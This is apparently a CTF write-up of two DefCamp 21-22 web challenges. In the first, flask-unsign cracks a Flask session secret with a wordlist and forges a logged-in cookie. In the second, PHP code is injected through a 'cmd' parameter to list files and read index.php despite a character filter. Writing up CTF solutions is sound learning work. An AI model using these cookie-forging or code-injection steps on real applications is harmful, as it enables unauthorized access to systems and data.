#  DefCamp CTF 21-22

## Web-intro:

I will use flask-unsign to decode flask cookie:

Install:

```
$ pip3 install flask-unsign
```

*See more here: https://github.com/Paradoxis/Flask-Unsign*

```
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgvWzw.RVvQdTFJNfYcF0W3VnMiB5avTuU'
```

![image](https://user-images.githubusercontent.com/83667873/154107707-e97af813-b428-418f-8a41-22abe662207f.png)

You can see "logged_in" is false. We must create new cookie with "logged_in" value is true.

First, We need to find secret key. I will use `rockme.txt` wordlist to bruteforce.

```
flask-unsign --unsign --cookie eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgvWzw.RVvQdTFJNfYcF0W3VnMiB5avTuU --wordlist  rockyou.txt --no-literal-eval
```

![image](https://user-images.githubusercontent.com/83667873/154108439-457360df-4dee-496c-8f8e-e786e52f5ba9.png)

Found secret key: `password`. 

I will use seccret key to create new cookie has value `logged_in: True`

```
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password'
```

![image](https://user-images.githubusercontent.com/83667873/154108616-52ac92be-802a-4776-bed7-0e066caf2d0a.png)

Change cookie value to new value, we will get the flag:

![image](https://user-images.githubusercontent.com/83667873/154109040-e868b019-6ae8-4a14-86bf-c6735ad82e1e.png)

## casual-defence

![image](https://user-images.githubusercontent.com/83667873/154109378-5afec01b-fc88-49f1-9b78-fb50f1428e1a.png)

cmd parameter will get php command:

![image](https://user-images.githubusercontent.com/83667873/154109600-27a8f418-eb76-44d4-a0ac-965d0acb4ef1.png)

Disable function:

![image](https://user-images.githubusercontent.com/83667873/154109861-a31bd435-593b-460d-ac98-11476a01a80b.png)

Because, `.` is filtered, so I will use below command to list file in current directory:

```
scandir(getcwd());
```

![image](https://user-images.githubusercontent.com/83667873/154110766-96b933c0-e71b-4c0c-9dbd-6dfa509d439d.png)

Oh, nothing is special, so try to to show file index.php:

You can see  `index.php` is at the position immediately before the last element. So use below command to get filename:

![image](https://user-images.githubusercontent.com/83667873/154112213-b24eaa55-fe86-4cff-b720-db80983b4f08.png)


Read file:

![image](https://user-images.githubusercontent.com/83667873/154112354-6dcfd661-39ab-48e1-91a4-e32bc1356abe.png)


**Flag: CTF{40c7bf1cd2186ce4f14720c4243f1e276a8abe49004b788921828f13a026c5f1}**

